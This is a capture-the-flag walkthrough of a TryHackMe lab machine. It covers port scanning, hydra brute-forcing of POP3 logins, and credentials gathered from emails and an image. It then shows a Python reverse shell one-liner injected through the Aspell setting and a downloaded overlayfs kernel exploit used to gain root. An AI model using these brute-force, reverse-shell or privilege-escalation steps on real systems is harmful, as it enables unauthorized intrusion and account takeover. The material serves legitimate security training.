`Machine ip: xx.xx.xxx.xx`

Running a nmap scan on the target we get the open ports:

`Open Ports:
25 stmp
80 http
55007 pop3
55006 
`

`Password from website source:
73 110 118 105 110 99 105 98 108 101 72 97 99 107 51 114
InvincibleHack3r --> decoded`

Search and replace for converting to a form that some online decoder can understand.

The site says navigate to a /sev-home/, so do that. Now we're at a login screen.

We know the username is boris from the source and we decoded the password.

`User: boris Password: InvincibleHack3r (For the http port)`

These creds don't work when we try to login into pop3 port [pop3 command line](https://electrictoolbox.com/pop3-commands/). So, we use hydra to brute-force the password there.

We don't anything for boris so we try again with natalya.

`hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3://10.10.28.74:55007`

We get a hit for the natalya 

`User: natalya Password: bird (For the pop3 port)`

After connecting to the pop3 port we use pop3 commands to get to the information we need.

list command lists the files and retr \<filename\> displays them. We see 2 mails but the first one is useless and the second one contains some creds.

`User: xenia Password: RCP90rulez!(For the http port)`

We got the password but the mail said: 
`And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....
Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.`

So we add \<machine_ip\> severnaya-station.com/gnocertdir to our /etc/hosts to access it on the browser.

Now logging as xenia in that website. According to tryhackme, we need to find another user. He is named doak. We try to brute-force his password again using hydra. 

`User: doak Password: goat(For the pop3 port)`

We login into doak's pop3 account and read his emails too to get his http site password.

`User: dr_doak Password: 4England!(For the http port)`

Logging into the website using these creds we poke around even further. We find a file called s3cret.txt.

It redirects us to a `/dir007key/for-007.jpg` saying there is something juicy there.

It's an image with some stegnography probably. Running exiftool command, we see the image description is base64. Decoding it we get 'xWinter1995x!'

we can assume this is the password for the admin user as that was the only other account in dr_doak.

We log into admin account using these creds.

`User: admin Password: xWinter1995x!`

Tryhackme told us to look for Aspell. We can search for it in the search bar below and we find a place to add a python reverse shell :).
We also need to change the spell engine to *PspellShell* that's after googling I found out that that's what's compatible with python.

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

Listening to the port on our system we get a shell. To find the kernal version we use _uname -a_.

The kernel version is 3.13.0-32-generic which is a very outdated kernel so exploit.db must have a priv esc script. There is [one](https://www.exploit-db.com/exploits/37292) and then download it onto the vm server
using python simple http server and wget.

_python -m SimpleHTTPServer_

Trying to compile the code using `gcc` we find that `gcc` is not installed but cc is.

So all we need to do is to replace `gcc` by `cc` in the exploit.

_sed -i "s/gcc/cc/g" overlayfs.c_

Now we compile and run this to get root access.

_cc overlayfs.c -o root_access_
_./root_access_

We get some warnings but we can ignore them for now as we're root already.

Now nagvigate over to the root floder and `cat` the hidden root flag.

#And We're Done!
